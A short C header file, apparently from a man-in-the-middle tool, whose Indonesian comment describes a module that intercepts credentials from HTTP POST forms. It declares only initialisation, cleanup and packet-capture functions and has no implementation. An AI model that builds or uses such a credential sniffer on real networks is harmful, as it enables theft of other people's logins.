// ============================================================================
// HEADER: mitm/capture.h — Penyadap Kredensial Formulir POST HTTP
// ============================================================================
#ifndef MITM_CAPTURE_H
#define MITM_CAPTURE_H

#include "../config.h"

int capture_init(void);
void capture_cleanup(void);
int capture_http(const uint8_t *data, int len);

#endif // MITM_CAPTURE_H
